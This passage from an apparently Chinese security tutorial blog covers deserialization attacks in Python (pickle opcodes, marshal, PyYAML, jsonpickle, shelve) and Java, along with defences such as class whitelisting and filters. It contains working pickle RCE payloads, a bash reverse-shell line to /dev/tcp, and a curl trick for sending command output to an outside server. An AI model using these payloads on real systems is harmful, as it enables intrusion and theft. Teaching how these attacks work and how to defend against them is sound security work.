+<h6 id="c指令module受限"><a href="#c指令module受限" class="headerlink" title="c指令module受限"></a>c指令module受限</h6><p><code>c</code>指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法， 然而<code>find_class</code>可以被出题人重写。如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个module，上述题又该如何解决呢？</p>
+<p>通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
+<ul>
+<li>通过<code>__main__.blue</code>引入这一个module，由于命名空间还在main内，故不会被拦截</li>
+<li>把一个dict压进栈，内容是<code>&#123;&#39;name&#39;: &#39;rua&#39;, &#39;grade&#39;: &#39;www&#39;&#125;</code></li>
+<li>执行BUILD指令，会导致改写 <code>__main__.blue.name</code>和 <code>__main__.blue.grade</code> ，至此<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li>
+<li>弹掉栈顶，现在栈变成空的</li>
+<li>照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是’rua’和’www’</li>
+</ul>
+<p>由于栈顶是正常的Student对象，pickle.loads将会正常返回。到手的Student对象，当然name和grade都与blue.name、blue.grade对应了——我们刚刚亲手把blue篡改掉</p>
+<h6 id="利用b指令码实现rce"><a href="#利用b指令码实现rce" class="headerlink" title="利用b指令码实现rce"></a>利用b指令码实现rce</h6><p>b指令码，即build指令。</p>
+<ul>
+<li>把当前栈栈顶存进<code>state</code>，然后弹掉。</li>
+<li>把当前栈栈顶记为<code>inst</code>，然后弹掉。</li>
+<li>利用<code>state</code>这一系列的值来<strong>更新实例</strong><code>inst</code>。把得到的对象扔进当前栈。</li>
+</ul>
+<p>注意：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__ </code>里面。</p>
+<p>这里存在安全隐患：<code>Student</code>原先是没有<code>__setstate__</code>这个方法的。那么我们利用<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来BUILE这个对象，那么现在对象的<code>__setstate__</code>就变成了<code>os.system</code>；接下来利用<code>&quot;ls /&quot;</code>来再次BUILD这个对象，则会执行<code>setstate(&quot;ls /&quot;)</code> ，而此时<code>__setstate__</code>已经被我们设置为<code>os.system</code>，因此实现了RCE.</p>
+<p>payload：</p>
+<pre><code>payload = b&#39;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#39;
+</code></pre>
+<p>有一个可以改进的地方：这份payload由于没有返回一个Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常Student进栈。payload构造如下：</p>
+<pre><code class="text">payload = b&#39;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#39;
+</code></pre>
+<h6 id="使用i指令码实现rce"><a href="#使用i指令码实现rce" class="headerlink" title="使用i指令码实现rce"></a>使用i指令码实现rce</h6><pre><code>def pop_mark(self):
+    items = self.stack
+    self.stack = self.metastack.pop()
+    self.append = self.stack.append
+    return items
+
+def load_inst(self):
+        module = self.readline()[:-1].decode(&quot;ascii&quot;)
+        name = self.readline()[:-1].decode(&quot;ascii&quot;)
+        klass = self.find_class(module, name)
+        self._instantiate(klass, self.pop_mark())
+    dispatch[INST[0]] = load_inst
+</code></pre>
+<p>首先通过<code>find_class</code>获得方法，然后通过<code>pop_mark</code>获得参数（弹出前序栈重新赋值给当前栈，而且获取当前栈上的内容），并调用<code>_instantiate</code>函数来执行，并将执行的结果存入栈中。</p>
+<p>处理前payload：</p>
+<pre><code>b&#39;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#39;
+</code></pre>
+<p>处理后payload：</p>
+<p>将<code>\x80\x03c__main__\nB\n)</code>改成<code>\x80\x03c__main__\nA\n&#125;(Vls -laios\nsystem\n0c__main__\nB\n)</code></p>
+<pre><code>b&#39;\x80\x03c__main__\nA\n&#125;(Vls -laios\nsystem\n0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#39;
+</code></pre>
+<h6 id="使用o指令码实现rce"><a href="#使用o指令码实现rce" class="headerlink" title="使用o指令码实现rce"></a>使用o指令码实现rce</h6><p>o指令码与i指令码作用基本相同</p>
+<pre><code>def pop_mark(self):
+    items = self.stack
+    self.stack = self.metastack.pop()
+    self.append = self.stack.append
+    return items
+
+def load_obj(self):
+        # Stack is ... markobject classobject arg1 arg2 ...
+        args = self.pop_mark()
+        cls = args.pop(0)
+        self._instantiate(cls, args)
+    dispatch[OBJ[0]] = load_obj
+</code></pre>
+<p>修改前：</p>
+<pre><code>b&#39;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#39;
+</code></pre>
+<p>修改后</p>
+<pre><code>b&#39;\x80\x03c__main__\nA\n&#125;(cos\nsystem\nX\x06\x00\x00\x00ls -lao0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#39;
+</code></pre>
+<p><strong>一些细节</strong></p>
+<p>一、其他模块的load也可以触发pickle反序列化漏洞。例如：numpy.load()先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此numpy.load()也可以触发pickle反序列化漏洞。</p>
+<p>二、即使代码中没有import os，GLOBAL指令也可以自动导入os.system。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p>
+<p>三、即使没有回显，也可以很方便地调试恶意代码。只需要拥有一台公网服务器，执行os.system(‘curl your_server&#x2F;<code>ls / | base64</code>)，然后查询您自己的服务器日志，就能看到结果。这是因为：以&#96;引号包含的代码，在sh中会直接执行，返回其结果。</p>
+<p>从0开始：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p>
+<p>手敲opcode：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>
+<p>​					<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981%E6%89%BE%E5%88%B0">https://www.anquanke.com/post/id/188981%E6%89%BE%E5%88%B0</a></p>
+<p><a target="_blank" rel="noopener" href="https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#title-16">https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#title-16</a></p>
+<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><p>官方推荐定制<code>Unpickler.find_class()</code>函数来限制模块和其中的类，但即便必须在<code>builtins</code>模块下执行也能够找到不少类似于沙箱逃逸的办法来完成攻击，甚至直接编写<code>pickle</code>代码</p>
+<p>(1) 不要再不守信任的通道中传递 pcikle 序列化对象<br>(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播<br>(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据<br>(4) 将 pickle 加载的数据列入白名单</p>
+<h4 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a>marshal</h4><p>由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p>
+<h5 id="实现任意函数构造"><a href="#实现任意函数构造" class="headerlink" title="实现任意函数构造"></a>实现任意函数构造</h5><p>types.FunctionType配上marshal.loads</p>
+<pre><code class="python">import base64
+import marshal
+
+def foo():
+    import os
+    os.system(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;)
+
+payload=&quot;&quot;&quot;ctypes
+FunctionType
+(cmarshal
+loads
+(cbase64
+b64decode
+(S&#39;%s&#39;
+tRtRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.&quot;&quot;&quot;%base64.b64encode(marshal.dumps(foo.func_code))
+
+pickle.loads(payload)
+
+payload=&quot;&quot;&quot;ctypes
+FunctionType
+(cmarshal
+loads
+(S&#39;%s&#39;
+tRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.&quot;&quot;&quot;%marshal.dumps(foo.func_code).encode(&#39;string-escape&#39;)
+
+pickle.loads(payload)
+</code></pre>
+<p>new.function配上marshal.loads</p>
+<pre><code class="python">import base64
+import marshal
+
+def foo():
+    import os
+    os.system(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;)
+
+payload=&quot;&quot;&quot;cnew
+function
+(cmarshal
+loads
+(cbase64
+b64decode
+(S&#39;%s&#39;
+tRtRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.&quot;&quot;&quot;%base64.b64encode(marshal.dumps(foo.func_code))
+
+pickle.loads(payload)
+
+payload=&quot;&quot;&quot;cnew
+function
+(cmarshal
+loads
+(S&#39;%s&#39;
+tRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.&quot;&quot;&quot;%marshal.dumps(foo.func_code).encode(&#39;string-escape&#39;)
+
+pickle.loads(payload)
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25981037">https://zhuanlan.zhihu.com/p/25981037</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/</a></p>
+<h4 id="pyYaml"><a href="#pyYaml" class="headerlink" title="pyYaml"></a>pyYaml</h4><p>yaml和xml、json等类似，都是标记类语言，有自己的语法格式。各个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存），其中PyYAML就是python的一个yaml库。</p>
+<p>除了 YAML 格式中常规的列表、字典和字符串整形等类型转化外（基本数据类型），各个语言的 YAML 解析器或多或少都会针对其语言实现一套特殊的<strong>对象转化规则</strong>（也就是序列化和反序列化，这是关键点，是这个漏洞存在的前提)。</p>
+<p>使用了<code>yaml.load</code>而不是<code>yaml.safe_load</code>函数来解析yaml文件的程序，<code>yaml.load</code>和<code>pickle.load</code>具有一样的功能，可以调用所有python函数。</p>
+<p>yaml标签和python对象的关系，部分关系，详细<a target="_blank" rel="noopener" href="https://pyyaml.org/wiki/PyYAMLDocumentation">https://pyyaml.org/wiki/PyYAMLDocumentation</a></p>
+<pre><code>!!str	str或unicode
+!!map	dict
+!!python/str	str
+!!python/dict	dict
+!!python/name:module.name	module.name
+!!python/module:package.module	package.module
+!!python/object:module.cls	module.cls 
+!!python/object/new:module.cls	module.cls 
+!!python/object/apply:module.f	
+</code></pre>
+<p>为了支持pickle协议，提供了两种附加形式的<code>!!python/object</code>标签</p>
+<pre><code>!!python/object/new:module.Class
+args: [argument, ...]
+kwds: &#123;key: value, ...&#125;
+state: ...
+listitems: [item, ...]
+dictitems: [key: value, ...]
+
+!!python/object/apply:module.function
+args: [argument, ...]
+kwds: &#123;key: value, ...&#125;
+state: ...
+listitems: [item, ...]
+dictitems: [key: value, ...]
+</code></pre>
+<p>可以使用<code>!!python/object</code>序列化任意对象。</p>
+<pre><code class="none">!!python/object:module.Class &#123; attribute: value, ... &#125;
+</code></pre>
+<p>构造一个序列化，dump的结果就是上面的标签形式。</p>
+<pre><code>#coding:utf-8
+import yaml,os
+class test:
+    def __init__(self):
+        os.system(&#39;whoami&#39;)
+payload = yaml.dump(test())
+print(payload)
+yaml.load(payload)
+
+#misaki\user
+#!!python/object:__main__.test &#123;&#125;
+
+</code></pre>
+<h5 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h5><p>避免此问题可以使用<code>safe_load</code>来替换<code>load</code>，该函数<code>yaml.safe_load</code>将此功能限制为简单的Python对象（例如整数或列表）。</p>
+<h4 id="Jsonpickle"><a href="#Jsonpickle" class="headerlink" title="Jsonpickle"></a>Jsonpickle</h4><p>用于将任意对象序列化为JSON的Python库。<code>Jsonpickle</code>可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。该对象必须可以通过模块进行全局访问，并且必须继承自对象（又称新类）。<a target="_blank" rel="noopener" href="https://jsonpickle.github.io/#module-jsonpickle">https://jsonpickle.github.io/#module-jsonpickle</a></p>
+<p>序列化：</p>
+<p><code>frozen = jsonpickle.encode(obj)</code></p>
+<p>反序列化</p>
+<p><code>thawed = jsonpickle.decode(frozen)</code></p>
+<p>利用方式与pickle相似</p>
+<pre><code>&gt;&gt;&gt; class Thing(object):
+...     def __init__(self, name):
+...         os.system(&#39;whoami&#39;)
+...
+&gt;&gt;&gt; obj = Thing(&#39;Awesome&#39;)
+misaki\user
+</code></pre>
+<h4 id="Shelve"><a href="#Shelve" class="headerlink" title="Shelve"></a>Shelve</h4><p>shelve用处是让对象持久化，但它在序列化与反序列化的过程中使用了pickle模块，因此我们可以利用shelve会调用的pickle在反序列化过程中执行代码。</p>
+<pre><code>import shelve
+import os
+class exp(object):
+    def __reduce__(self):
+        return (os.system(&#39;ls&#39;))
+        
+file = shelve.open(&quot;test&quot;)
+file[&#39;exp&#39;] = exp()
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#PyYAML">https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#PyYAML</a></p>
+<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</p>
+<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
+<p>一个类的对象要想序列化成功，必须满足两个条件：</p>
+<ol>
+<li>该类必须实现 java.io.Serializable 接口。</li>
+<li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</li>
+</ol>
+<h4 id="漏洞发现-2"><a href="#漏洞发现-2" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><h5 id="开发失误"><a href="#开发失误" class="headerlink" title="开发失误"></a>开发失误</h5><ol>
+<li>重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。</li>
+<li>使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。</li>
+</ol>
+<h5 id="基础库中隐藏的反序列化漏洞"><a href="#基础库中隐藏的反序列化漏洞" class="headerlink" title="基础库中隐藏的反序列化漏洞"></a>基础库中隐藏的反序列化漏洞</h5><p>存在危险的基础库：</p>
+<pre><code>commons-fileupload 1.3.1
+commons-io 2.4
+commons-collections 3.1
+commons-logging 1.2
+commons-beanutils 1.9.2
+org.slf4j:slf4j-api 1.7.21
+com.mchange:mchange-commons-java 0.2.11
+org.apache.commons:commons-collections 4.0
+com.mchange:c3p0 0.9.5.2
+org.beanshell:bsh 2.0b5
+org.codehaus.groovy:groovy 2.3.9
+org.springframework:spring-aop 4.1.4.RELEASE
+</code></pre>
+<p>漏洞触发场景：</p>
+<ul>
+<li>1.HTTP请求中的参数</li>
+<li>2.RMI，即Java远程方法调用，在RMI中传输的数据皆为序列化</li>
+<li>3.JMX，一个为应用程序植入管理功能的框架</li>
+<li>4.自定义协议,用来接收与发送原始的java对象</li>
+</ul>
+<p>通过检索源码中对反序列化函数的调用来静态寻找反序列化的输入点<br>可以搜索以下函数：</p>
+<pre><code>ObjectInputStream.readObject
+ObjectInputStream.readUnshared
+XMLDecoder.readObject
+Yaml.load
+XStream.fromXML
+ObjectMapper.readValue
+JSON.parseObject
+</code></pre>
+<p>小数点前面是类名，后面是方法名</p>
+<p>② 确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可）。</p>
+<p>③ 若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。</p>
+<p>攻击工具：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p>在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。<br>在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。</p>
+<p>序列化数据通常以<code>AC ED</code>开始，之后的两个字节是版本号，版本号一般是<code>00 05</code>但在某些情况下可能是更高的数字。</p>
+<h6 id="RASP检测"><a href="#RASP检测" class="headerlink" title="RASP检测"></a>RASP检测</h6><p>Java程序中类<code>ObjectInputStream</code>的<code>readObject</code>方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p>
+<p>类的名称及serialVersionUID的ObjectStreamClass描述符在序列化对象流的前面位置，且在<code>readObject</code>反序列化时首先会调用resolveClass读取反序列化的类名，所以RASP检测反序列化漏洞时可通过重写ObjectInputStream对象的resolveClass方法获取反序列化的类即可实现对反序列化类的黑名单校验。</p>
+<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。</p>
+<p>PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。</p>
+<p>eg：</p>
+<pre><code>//反序列化所需类在io包中
+import java.io.*;
+public class test&#123;
+    public static void main(String args[]) throws Exception&#123;
+
+        UnsafeClass Unsafe = new UnsafeClass();
+        Unsafe.name = &quot;hacked by ph0rse&quot;;
+
+        FileOutputStream fos = new FileOutputStream(&quot;object&quot;);
+        ObjectOutputStream os = new ObjectOutputStream(fos);
+        //writeObject()方法将Unsafe对象写入object文件
+        os.writeObject(Unsafe);
+        os.close();
+        //从文件中反序列化obj对象
+        FileInputStream fis = new FileInputStream(&quot;object&quot;);
+        ObjectInputStream ois = new ObjectInputStream(fis);
+        //恢复对象
+        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();
+        System.out.println(objectFromDisk.name);
+        ois.close();
+    &#125;
+&#125;
+
+class UnsafeClass implements Serializable&#123;
+    public String name;
+    //重写readObject()方法
+    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123;
+        //执行默认的readObject()方法
+        in.defaultReadObject();
+        //执行命令
+        Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+    &#125;
+&#125;
+</code></pre>
+<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><h5 id="1-类白名单校验"><a href="#1-类白名单校验" class="headerlink" title="1.类白名单校验"></a><strong>1.类白名单校验</strong></h5><p>在<code>ObjectInputStream</code>中resolveClass 里只是进行了class 是否能被load，自定义ObjectInputStream, 重载resolveClass的方法，对className 进行白名单校验</p>
+<h5 id="2-禁止JVM执行外部命令Runtime-exec"><a href="#2-禁止JVM执行外部命令Runtime-exec" class="headerlink" title="2.禁止JVM执行外部命令Runtime.exec"></a><strong>2.禁止JVM执行外部命令Runtime.exec</strong></h5><p>通过扩展SecurityManager可以实现</p>
+<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><h5 id="1、通过Hook-resolveClass来校验反序列化的类"><a href="#1、通过Hook-resolveClass来校验反序列化的类" class="headerlink" title="1、通过Hook resolveClass来校验反序列化的类"></a>1、通过Hook resolveClass来校验反序列化的类</h5><p>在使用<code>readObject()</code>反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写<code>ObjectInputStream</code>对象的resolveClass方法即可实现对反序列化类的校验。</p>
+<pre><code>public class AntObjectInputStream extends ObjectInputStream&#123;
+    public AntObjectInputStream(InputStream inputStream)
+            throws IOException &#123;
+        super(inputStream);
+    &#125;
+
+    /**
+     * 只允许反序列化SerialObject class
+     */
+    @Override
+    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException,
+            ClassNotFoundException &#123;
+        if (!desc.getName().equals(SerialObject.class.getName())) &#123;
+            throw new InvalidClassException(
+                    &quot;Unauthorized deserialization attempt&quot;,
+                    desc.getName());
+        &#125;
+        return super.resolveClass(desc);
+    &#125;
+&#125;
+</code></pre>
+<p>通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。</p>
+<p>根据以上方法，有大牛实现了线程的<a target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller">SerialKiller</a>包可供使用。</p>
+<h5 id="2-使用ValidatingObjectInputStream来校验反序列化的类"><a href="#2-使用ValidatingObjectInputStream来校验反序列化的类" class="headerlink" title="2.使用ValidatingObjectInputStream来校验反序列化的类"></a>2.使用ValidatingObjectInputStream来校验反序列化的类</h5><p>使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白&#x2F;黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下:</p>
+<pre><code>private static Object deserialize(byte[] buffer) throws IOException,
+ClassNotFoundException , ConfigurationException &#123;
+    Object obj;
+    ByteArrayInputStream bais = new ByteArrayInputStream(buffer);
+    // Use ValidatingObjectInputStream instead of InputStream
+    ValidatingObjectInputStream ois = new   ValidatingObjectInputStream(bais); 
+
+    //只允许反序列化SerialObject class
+    ois.accept(SerialObject.class);
+    obj = ois.readObject();
+    return obj;
+&#125;
+</code></pre>
+<h5 id="3-使用contrast-rO0防御反序列化攻击"><a href="#3-使用contrast-rO0防御反序列化攻击" class="headerlink" title="3.使用contrast-rO0防御反序列化攻击"></a>3.使用contrast-rO0防御反序列化攻击</h5><p>contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白&#x2F;黑名单控制，示例代码如下:</p>
+<pre><code>SafeObjectInputStream in = new SafeObjectInputStream(inputStream, true);
+in.addToWhitelist(SerialObject.class);
+
+in.readObject();
+</code></pre>
+<h5 id="4-使用ObjectInputFilter来校验反序列化的类"><a href="#4-使用ObjectInputFilter来校验反序列化的类" class="headerlink" title="4.使用ObjectInputFilter来校验反序列化的类"></a>4.使用ObjectInputFilter来校验反序列化的类</h5><p>Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白&#x2F;黑名单控制。示例代码如下:</p>
+<pre><code>import java.util.List;
+import java.util.Optional;
+import java.util.function.Function;
+import java.io.ObjectInputFilter;
+class BikeFilter implements ObjectInputFilter &#123;
+    private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.
+    private long maxDepth = 1; // Maximum depth of the graph allowed.
+    private long maxReferences = 1; // Maximum number of references in a graph.
+    @Override
+    public Status checkInput(FilterInfo filterInfo) &#123;
+        if (filterInfo.references() &lt; 0 || filterInfo.depth() &lt; 0 || filterInfo.streamBytes() &lt; 0 || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) &#123;
+            return Status.REJECTED;
+        &#125;
+        Class&lt;?&gt; clazz = filterInfo.serialClass();
+        if (clazz != null) &#123;
+            if (SerialObject.class == filterInfo.serialClass()) &#123;
+                return Status.ALLOWED;
+            &#125;
+            else &#123;
+                return Status.REJECTED;
+            &#125;
+        &#125;
+        return Status.UNDECIDED;
+    &#125; // end checkInput
+&#125; // end class BikeFilter
+</code></pre>
+<h5 id="5、禁止JVM执行外部命令Runtime-exec"><a href="#5、禁止JVM执行外部命令Runtime-exec" class="headerlink" title="5、禁止JVM执行外部命令Runtime.exec"></a>5、禁止JVM执行外部命令<code>Runtime.exec</code></h5><p>通过扩展SecurityManager</p>
+<pre><code>SecurityManager originalSecurityManager = System.getSecurityManager();
+        if (originalSecurityManager == null) &#123;
+            // 创建自己的SecurityManager
+            SecurityManager sm = new SecurityManager() &#123;
+                private void check(Permission perm) &#123;
+                    // 禁止exec
+                    if (perm instanceof java.io.FilePermission) &#123;
+                        String actions = perm.getActions();
+                        if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) &#123;
+                            throw new SecurityException(&quot;execute denied!&quot;);
+                        &#125;
+                    &#125;
+                    // 禁止设置新的SecurityManager，保护自己
+                    if (perm instanceof java.lang.RuntimePermission) &#123;
+                        String name = perm.getName();
+                        if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) &#123;
+                            throw new SecurityException(&quot;System.setSecurityManager denied!&quot;);
+                        &#125;
+                    &#125;
+                &#125;
+
+                @Override
+                public void checkPermission(Permission perm) &#123;
+                    check(perm);
+                &#125;
+
+                @Override
+                public void checkPermission(Permission perm, Object context) &#123;
+                    check(perm);
+                &#125;
+            &#125;;
+
+            System.setSecurityManager(sm);
+        &#125;
+</code></pre>
+<h5 id="6、不建议使用的黑名单"><a href="#6、不建议使用的黑名单" class="headerlink" title="6、不建议使用的黑名单"></a>6、不建议使用的黑名单</h5><p>在反序列化时设置类的黑名单来防御反序列化漏洞利用及攻击，这个做法在源代码修复的时候并不是推荐的方法，因为你不能保证能覆盖所有可能的类，而且有新的利用payload出来时也需要随之更新黑名单，但有一种场景下可能黑名单是一个不错的选择。写代码的时候总会把一些经常用到的方法封装到公共类，这样其它工程中用到只需要导入jar包即可，此前已经见到很多提供反序列化操作的公共接口，使用第三方库反序列化接口就不好用白名单的方式来修复了。这个时候作为第三方库也不知道谁会调用接口，会反序列化什么类，所以这个时候可以使用黑名单的方式来禁止一些已知危险的类被反序列化，具体的黑名单类可参考contrast-rO0、ysoserial中paylaod包含的类。</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95.html">https://wooyun.js.org/drops/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95.html</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+    </div>
+    <a href="/2022/08/24/八，反序列化漏洞/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/08/24/十一·，Nodejs原型链污染/">
+        <h2>
+            
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/8/24
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h1 id="nodejs原型链污染"><a href="#nodejs原型链污染" class="headerlink" title="nodejs原型链污染"></a>nodejs原型链污染</h1><h2 id="NodeJS基础"><a href="#NodeJS基础" class="headerlink" title="NodeJS基础"></a>NodeJS基础</h2><p>它是由C++开发的，它只是一个JavaScript语言解释器。<br>REPL环境运行JavaScript的代码</p>
+<p>在浏览器的控制台或者node的运行环境都属于REPL运行环境，均可以运行JS代码。<br>在NodeJS中分为三个模块，分别是：核心模块、自定义模块、第三方模块。<br>这里提一点，JS代码在编程时，如果需要使用某个模块的功能，那么就需要提前将其导入，与Python类似，只不过在Python中使用import关键字，而JS中使用require关键字。</p>
+<p>文档：<a target="_blank" rel="noopener" href="http://nodejs.cn/api/fs.html">http://nodejs.cn/api/fs.html</a></p>
+<p>基本读文件操作：</p>
+<pre><code>var fs = require(&#39;fs&#39;);//导入fs模块
+fs.readFile(&#39;./haha.txt&#39;,&#39;utf8&#39;,function(err,data)&#123;
+    console.log(err);
+    console.log(&#39;---分界线----&#39;);
+    console.log(data);
+&#125;);
+console.log(&quot;wuhu&quot;);
+</code></pre>
+<h3 id="同步与异步"><a href="#同步与异步" class="headerlink" title="同步与异步"></a>同步与异步</h3><p>同步：按顺序执行</p>
+<p>异步：同时开始执行</p>
+<p>异步案例：</p>
+<pre><code>var fs = require(&#39;fs&#39;);//导入fs模块
+fs.readFile(&#39;./haha.txt&#39;,&#39;utf8&#39;,function(err,data)&#123;
+    console.log(err);
+    console.log(&#39;---分界线----&#39;);
+    console.log(data);
+&#125;);
